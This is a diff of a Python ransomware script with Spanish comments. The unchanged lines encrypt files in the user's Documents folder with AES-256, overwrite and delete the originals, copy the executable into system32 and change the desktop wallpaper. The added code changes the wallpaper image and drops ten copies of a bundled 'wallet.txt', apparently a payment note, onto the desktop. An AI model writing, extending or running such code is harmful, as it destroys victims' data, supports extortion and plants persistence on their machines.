@@ -66,9 +66,6 @@ def borrar_archivo_seguro(archivo):
     # Eliminar el archivo después de sobrescribirlo
     os.remove(archivo)
 
-
-
-
 # Función para copiar el ejecutable a la carpeta system32
 def copiar_ejecutable_a_system32():
     windir = os.environ['WINDIR']
@@ -94,9 +91,30 @@ def cambiar_fondo_escritorio(ruta_imagen):
 def obtener_ruta_imagen_empaquetada():
     # Si el script se está ejecutando desde un .exe empaquetado
     if getattr(sys, '_MEIPASS', False):
-        return os.path.join(sys._MEIPASS, 'fondo.jpeg')  # Nombre de la imagen
+        return os.path.join(sys._MEIPASS, 'fondo.png')  # Nombre de la imagen
     else:
-        return 'fondo.jpeg'  # Ruta alternativa si no está empaquetada
+        return 'fondo.png'  # Ruta alternativa si no está empaquetada
+
+# Función para copiar el archivo wallet.txt al escritorio 10 veces, aumentando las "t"s
+def copiar_wallet_al_escritorio():
+    user_profile = os.environ['USERPROFILE']
+    desktop_dir = os.path.join(user_profile, 'Desktop')  # Ruta del escritorio
+
+    # Ruta al archivo original wallet.txt (obtenido desde PyInstaller)
+    if getattr(sys, 'frozen', False):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+
+    wallet_path = os.path.join(base_path, 'wallet.txt')
+
+    for i in range(10):
+        # Crear el nombre del archivo con un número creciente de 't's
+        nombre_archivo = f"wallett{'t' * i}.txt"
+        ruta_destino = os.path.join(desktop_dir, nombre_archivo)
+
+        # Copiar wallet.txt al escritorio con el nuevo nombre
+        shutil.copy(wallet_path, ruta_destino)
 
 
  
@@ -138,5 +156,8 @@ for foldername, subfolders, filenames in os.walk(documents_dir):
 # Cambiar el fondo de escritorio al final
 ruta_imagen = obtener_ruta_imagen_empaquetada()
 cambiar_fondo_escritorio(ruta_imagen)
+
+# Copiar wallet.txt al escritorio 10 veces
+copiar_wallet_al_escritorio()
 
 print(f'Archivos cifrados con AES-256 en {documents_dir}. La clave AES cifrada ha sido guardada en "clave_aes_cifrada.txt". Los archivos originales han sido eliminados.')
